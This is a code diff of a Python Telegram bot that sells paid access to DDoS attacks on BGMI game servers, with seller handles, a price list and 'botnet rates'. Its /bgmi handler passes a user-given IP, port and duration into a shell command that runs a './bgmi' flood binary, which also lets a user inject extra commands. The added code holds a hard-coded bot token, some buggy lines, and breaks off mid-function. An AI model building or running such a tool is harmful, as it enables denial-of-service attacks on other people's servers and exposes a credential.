@@ -1,455 +1,267 @@
-#script by @venomXcrazy
-
-import telebot
-import subprocess
+import asyncio
+import json
+import logging
+import time
+import signal
+from aiogram import Bot, Dispatcher
+from aiogram.types import Message
+from aiogram import filters
 import datetime
-import os
+import timedelta
+import os 
+import sys
 
-from keep_alive import keep_alive
-keep_alive()
-# insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEN')
+logging.basicConfig(level=logging.INFO)
 
-# Admin user IDs
-admin_id = ["your id"]
 
-# File to store allowed user IDs
-USER_FILE = "users.txt"
+API_TOKEN = '7325351596:AAHQ4vYsPtt9R_hjawfPZfOM-AS5wi4lX2Q'
 
-# File to store command logs
-LOG_FILE = "log.txt"
+AUTHORIZED_USERS = {"6638229469"}
 
-# Function to read user IDs from the file
-def read_users():
+def load_authorized_users():
+    global AUTHORIZED_USERS
     try:
-        with open(USER_FILE, "r") as file:
-            return file.read().splitlines()
-    except FileNotFoundError:
-        return []
-
-# Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
+        with open("authorized_users.json", "r") as f:
+            users = json.load(f)
+            for user_id, user_data in users.items():
+                if isinstance(user_data, dict) and "authorized_until" in user_data:
+                    AUTHORIZED_USERS[int(user_id)] = {"authorized_until": datetime.datetime.fromtimestamp(user_data["authorized_until"])}
+                else:
+                    print(f"Warning: User {user_id} has no 'authorized_until' field in authorized_users.json")
     except FileNotFoundError:
         pass
 
-# List to store allowed user IDs
-allowed_user_ids = read_users()
+def save_authorized_users():
+    with open("authorized_users.json", "w") as f:
+        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
+        json.dump(users, f)
 
-# Function to log command to the file
-def log_command(user_id, target, port, time):
-    admin_id = ["5588464519"]
-    user_info = bot.get_chat(user_id)
-    if user_info.username:
-        username = "@" + user_info.username
-    else:
-        username = f"UserID: {user_id}"
-    
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+load_authorized_users()
 
-# Function to clear logs
-def clear_logs():
-    try:
-        with open(LOG_FILE, "r+") as file:
-            if file.read() == "":
-                response = "Logs are already cleared. No data found ❌."
-            else:
-                file.truncate(0)
-                response = "Logs cleared successfully ✅"
-    except FileNotFoundError:
-        response = "No logs found to clear."
-    return response
+ADMIN_ID = 6638229469
 
-# Function to record command logs
-def record_command_logs(user_id, command, target=None, port=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        log_entry += f" | Target: {target}"
-    if port:
-        log_entry += f" | Port: {port}"
-    if time:
-        log_entry += f" | Time: {time}"
-    
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
-
-import datetime
-
-# Dictionary to store the approval expiry date for each user
-user_approval_expiry = {}
-
-# Function to calculate remaining approval time
-def get_remaining_approval_time(user_id):
-    expiry_date = user_approval_expiry.get(user_id)
-    if expiry_date:
-        remaining_time = expiry_date - datetime.datetime.now()
-        if remaining_time.days < 0:
-            return "Expired"
-        else:
-            return str(remaining_time)
-    else:
-        return "N/A"
-
-# Function to add or update user approval expiry date
-def set_approval_expiry_date(user_id, duration, time_unit):
-    current_time = datetime.datetime.now()
-    if time_unit == "hour" or time_unit == "hours":
-        expiry_date = current_time + datetime.timedelta(hours=duration)
-    elif time_unit == "day" or time_unit == "days":
-        expiry_date = current_time + datetime.timedelta(days=duration)
-    elif time_unit == "week" or time_unit == "weeks":
-        expiry_date = current_time + datetime.timedelta(weeks=duration)
-    elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
-    else:
+async def check_authorization(user_id):
+    if user_id not in AUTHORIZED_USERS:
         return False
-    
-    user_approval_expiry[user_id] = expiry_date
+    user_data = AUTHORIZED_USERS[user_id]
+    if user_data["authorized_until"] < datetime.datetime.now():
+        del AUTHORIZED_USERS[user_id]
+        save_authorized_users()
+        return False
     return True
 
-# Command handler for adding a user with approval time
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 2:
-            user_to_add = command[1]
-            duration_str = command[2]
+async def add_user(message: Message):
+    if message.from_user.id!= ADMIN_ID:
+        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
+        return
+    args = message.text.split()[1:]
+    if len(args)!= 2:
+        await message.answer("Usage: /adduser <user_id> <authorization_period>")
+        return
+    user_id = int(args[0])
+    authorization_period = int(args[1])
+    AUTHORIZED_USERS[user_id] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=authorization_period)}
+    save_authorized_users()
+    await message.answer(f"User {user_id} added with authorization period of {authorization_period} minutes.")
 
-            try:
-                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
-                if duration <= 0:
-                    raise ValueError
-                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
-                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
-                    raise ValueError
-            except ValueError:
-                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
-                bot.reply_to(message, response)
-                return
-
-            if user_to_add not in allowed_user_ids:
-                allowed_user_ids.append(user_to_add)
-                with open(USER_FILE, "a") as file:
-                    file.write(f"{user_to_add}\n")
-                if set_approval_expiry_date(user_to_add, duration, time_unit):
-                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
-                else:
-                    response = "Failed to set approval expiry date. Please try again later."
-            else:
-                response = "User already exists 🤦‍♂️."
-        else:
-            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
+async def remove_user(message: Message):
+    if message.from_user.id!= ADMIN_ID:
+        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
+        return
+    args = message.text.split()[1:]
+    if len(args)!= 1:
+        await message.answer("Usage: /removeuser <user_id>")
+        return
+    user_id = int(args[0])
+    if user_id in AUTHORIZED_USERS:
+        del AUTHORIZED_USERS[user_id]
+        save_authorized_users()
+        await message.answer(f"User {user_id} removed.")
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy."
+        await message.answer(f"User {user_id} not found.")
 
-    bot.reply_to(message, response)
-
-# Command handler for retrieving user info
-@bot.message_handler(commands=['myinfo'])
-def get_user_info(message):
-    user_id = str(message.chat.id)
-    user_info = bot.get_chat(user_id)
-    username = user_info.username if user_info.username else "N/A"
-    user_role = "Admin" if user_id in admin_id else "User"
-    remaining_time = get_remaining_approval_time(user_id)
-    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
-    bot.reply_to(message, response, parse_mode="HTML")
-
-
-
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 1:
-            user_to_remove = command[1]
-            if user_to_remove in allowed_user_ids:
-                allowed_user_ids.remove(user_to_remove)
-                with open(USER_FILE, "w") as file:
-                    for user_id in allowed_user_ids:
-                        file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} removed successfully 👍."
-            else:
-                response = f"User {user_to_remove} not found in the list ❌."
-        else:
-            response = '''Please Specify A User ID to Remove. 
-✅ Usage: /remove <userid>'''
+async def update_user(message: Message):
+    if message.from_user.id!= ADMIN_ID:
+        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
+        return
+    args = message.text.split()[1:]
+    if len(args)!= 2:
+        await message.answer("Usage: /updateuser <user_id> <new_authorization_period>")
+        return
+    user_id = int(args[0])
+    new_authorization_period = int(args[1])
+    if user_id in AUTHORIZED_USERS:
+        AUTHORIZED_USERS[user_id]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=new_authorization_period)
+        save_authorized_users()
+        await message.answer(f"User {user_id} updated with new authorization period of {new_authorization_period} minutes.")
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy 🙇."
+        await message.answer(f"User {user_id} not found.")
 
-    bot.reply_to(message, response)
+async def list_users(message: Message):
+    if message.from_user.id!= ADMIN_ID:
+        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
+        return
+    user_list = []
+    for user_id, user_data in AUTHORIZED_USERS.items():
+        user_list.append(f"{user_id} - Authorized until: {user_data['authorized_until']}")
+    await message.answer("Authorized users:\n" + "\n".join(user_list))
 
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_command(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
+async def broadcast(message: Message):
+    if message.from_user.id!= ADMIN_ID:
+        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
+        return
+    text = message.text.split(maxsplit=1)[1]
+    for user_id in AUTHORIZED_USERS:
         try:
-            with open(LOG_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found ❌."
-                else:
-                    file.truncate(0)
-                    response = "Logs Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "Logs are already cleared ❌."
-    else:
-        response = "You have not purchased yet purchase now from :- @venomXcrazy ❄."
-    bot.reply_to(message, response)
+            await bot.send_message(user_id, text)
+        except Exception as e:
+            logging.error(f"Error sending message to user {user_id}: {e}")
 
+def save_authorized_users():
+    with open("authorized_users.json", "w") as f:
+        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
+        json.dump(users, f)
 
-@bot.message_handler(commands=['clearusers'])
-def clear_users_command(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "USERS are already cleared. No data found ❌."
-                else:
-                    file.truncate(0)
-                    response = "users Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "users are already cleared ❌."
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @venomXcrazy 🙇."
-    bot.reply_to(message, response)
- 
+async def restart_bot(message: Message):
+    if message.from_user.id!= ADMIN_ID:
+        await message.answer("😂 𝘽𝙨𝙙𝙠 𝘼𝙙𝙢𝙞𝙣 𝙃𝙤 𝙆𝙮𝙖 𝙏𝙪𝙢 ? 😒🤣")
+        return
+    await message.answer("Restarting bot...")
+    save_authorized_users()
+    os.execl(sys.executable, sys.executable, *sys.argv)
 
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                if user_ids:
-                    response = "Authorized Users:\n"
-                    for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception as e:
-                            response += f"- User ID: {user_id}\n"
-                else:
-                    response = "No data found ❌"
-        except FileNotFoundError:
-            response = "No data found ❌"
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            try:
-                with open(LOG_FILE, "rb") as file:
-                    bot.send_document(message.chat.id, file)
-            except FileNotFoundError:
-                response = "No data found ❌."
-                bot.reply_to(message, response)
+async def user_info(message: Message):
+    user_id = message.from_user.id
+    user_data = AUTHORIZED_USERS.get(user_id)
+    if user_data:
+        approval_expiry = user_data["authorized_until"]
+        if approval_expiry > datetime.datetime.now():
+            approval_expiry_str = approval_expiry.strftime("%Y-%m-%d %H:%M:%S")
         else:
-            response = "No data found ❌"
-            bot.reply_to(message, response)
+            approval_expiry_str = "Not approved"
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @mesh213 ❄."
-        bot.reply_to(message, response)
+        approval_expiry_str = "𝙊𝙥𝙥𝙨 𝙉𝙤𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙚𝙙 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 @sumit_dhole_07"
 
-
-# Function to handle the reply when free users run the /bgmi command
-def start_attack_reply(message, target, port, time):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
+    username = message.from_user.username
+    await message.answer(f"🔖 𝙍𝙤𝙡𝙚: 𝙐𝙨𝙚𝙧\n"
+                         f"🆔 𝙐𝙨𝙚𝙧 𝙄𝘿: {user_id}\n"
+                         f"👤 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n"
+                         f"⏳ 𝘼𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙤𝙧 𝙀𝙭𝙥𝙞𝙧𝙮: {approval_expiry_str}")
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @venomXcrazy"
-    bot.reply_to(message, response)
+attack_process = None
+last_attack_time = 0
+async def welcome_user(message: Message):
+    if not await check_authorization(message.from_user.id):
+        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @sumit_dhole_07 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
+        return
 
-# Dictionary to store the last time each user ran the /bgmi command
-bgmi_cooldown = {}
+    await message.answer(f"𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝘽𝙤𝙩! 🚀\n\n"
 
-COOLDOWN_TIME =0
+                         f"𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙨 𝙮𝙤𝙪 𝙩𝙤 𝙡𝙖𝙪𝙣𝙘𝙝 𝙖 𝘽𝙂𝙈𝙄 𝙖𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 𝙖 𝙩𝙖𝙧𝙜𝙚𝙩 𝙄𝙋 𝙖𝙣𝙙 𝙥𝙤𝙧𝙩.\n\n" 
 
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
-            else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 700"
-                process = subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
-                bot.reply_to(message, response)  # Notify the user that the attack is finished
-        else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
-    else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
+                         f"𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨> <𝙩𝙝𝙧𝙚𝙖𝙙𝙨>  \n\n"    
 
-    bot.reply_to(message, response)
+                           "𝙀𝙭𝙖𝙢𝙥𝙡𝙚:/𝙗𝙜𝙢𝙞 20.235.94.237 17870 180 180\n\n") 
 
+LAST_ATTACK_TIME = {}
 
-# Add /mylogs command to display logs recorded for bgmi and website commands
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        try:
-            with open(LOG_FILE, "r") as file:
-                command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-                if user_logs:
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-                else:
-                    response = "❌ No Command Logs Found For You ❌."
-        except FileNotFoundError:
-            response = "No command logs found."
-    else:
-        response = "You Are Not Authorized To Use This Command 😡."
+async def bgmi_attack(message: Message):
+    if not await check_authorization(message.from_user.id):
+        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @sumit_dhole_07 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
+        return
+    if message.from_user.id not in AUTHORIZED_USERS:
+        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @sumit_dhole_07 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨‌.")
+        return
 
-    bot.reply_to(message, response)
+    current_time = time.time()
 
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
-💥 /myinfo : TO Check Your WHOLE INFO.
+    if message.from_user.id in LAST_ATTACK_TIME and current_time - LAST_ATTACK_TIME[message.from_user.id] < 200:
+        remaining_seconds = 200 - (current_time - LAST_ATTACK_TIME[message.from_user.id])
+        minutes, seconds = divmod(remaining_seconds, 60)
+        time_str = f"{int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} "
+        await message.answer(f"𝙔𝙤𝙪 𝙢𝙪𝙨𝙩 𝙬𝙖𝙞𝙩 {time_str}. 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙨𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝙖𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙩𝙩𝙖𝙘𝙠")
+        return
 
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.
+    args = message.text.split()[1:]
+    if len(args) < 4:
+        await message.answer(" 🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨> <𝙩𝙝𝙧𝙚𝙖𝙙𝙨> \n\n 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /𝙗𝙜𝙢𝙞 20.235.94.237 17870 180 180")
+        return
 
-Buy From :- @venomXcrazy
-Official Channel :- https://t.me/V3NOM_CH3AT
-'''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-    bot.reply_to(message, help_text)
+    ip, port, time_seconds, threads = args
+    command = f"./bgmi {ip} {port} {time_seconds} {threads}"
 
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
-🤖Try To Run This Command : /help 
-✅BUY :- @venomXcrazy'''
-    bot.reply_to(message, response)
+    LAST_ATTACK_TIME[message.from_user.id] = current_time
 
-@bot.message_handler(commands=['rules'])
-def welcome_rules(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules ⚠️:
-
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/venomcha7 OTHERWISE NOT WORK
-4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['plan'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
-
-Vip 🌟 :
--> Attack Time : 300 (S)
-> After Attack Limit : 10 sec
--> Concurrents Attack : 5
-
-Pr-ice List💸 :
-Day-->80 Rs
-Week-->400 Rs
-Month-->1000 Rs
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-💥 /add <userId> : Add a User.
-💥 /remove <userid> Remove a User.
-💥 /allusers : Authorised Users Lists.
-💥 /logs : All Users Logs.
-💥 /broadcast : Broadcast a Message.
-💥 /clearlogs : Clear The Logs File.
-💥 /clearusers : Clear The USERS File.
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split(maxsplit=1)
-        if len(command) > 1:
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users 👍."
-        else:
-            response = "🤖 Please Provide A Message To Broadcast."
-    else:
-        response = "Only Admin Can Run This Command 😡."
-
-    bot.reply_to(message, response)
-
-
-
-#bot.polling()
-while True:
+    await message.answer(f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🔫  \n  🎯𝙄𝙋: {ip}\n 🏖️𝙋𝙤𝙧𝙩: {port}\n ⌚𝙏𝙞𝙢𝙚: {time_seconds} 𝙨𝙚𝙘.")
+    
     try:
-        bot.polling(none_stop=True)
+        attack_process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+
+        stdout, stderr = await attack_process.communicate()
+
+        response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {ip}:{port} \n 🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
+        if stdout:
+            response += f"\nOutput:\n{stdout.decode()}"
+        if stderr:
+            response += f"\nErrors:\n{stderr.decode()}"
+
+        await message.answer(response)
+
     except Exception as e:
-        print(e)
+        await message.answer(f"Error: {e}")
 
+async def bgmi_stop(message: Message):
+    if not await check_authorization(message.from_user.id):
+        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @sumit_dhole_07 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
+        return
+    if message.from_user.id not in AUTHORIZED_USERS:
+        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @sumit_dhole_07 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨‌.")
+        return
+    # Rest of the bgmi stop code
+    global attack_process
+    if attack_process is not None:
+        attack_process.terminate()
+        attack_process.wait()
+        attack_process = None
+        await message.answer("🚀Attack stopped.")
+    else:
+        await message.answer("No attack is currently running.")
 
+async def main():
+    bot = Bot(token=API_TOKEN)
+    dp = Dispatcher()
+
+    # Register handlers
+    dp.message.register(welcome_user, filters.Command("start"))
+    dp.message.register(bgmi_attack, filters.Command(commands=['bgmi']))
+    dp.message.register(broadcast, filters.Command("broadcast"))
+    dp.message.register(bgmi_stop, filters.Command("stop"))
+    dp.message.register(add_user, filters.Command("adduser"))
+    dp.message.register(remove_user, filters.Command("removeuser"))
+    dp.message.register(update_user, filters.Command("updateuser"))
+    dp.message.register(list_users, filters.Command("listuser"))
+    dp.message.register(restart_bot, filters.Command("restart"))
+    dp.message.register(user_info, filters.Command("userinfo"))
+
+    async def remove_expired_users():
+        while True:
+            global AUTHORIZED_USERS
+            for user_id in list(AUTHORIZED_USERS.keys()):
+                user_data = AUTHORIZED_USERS[user_id]
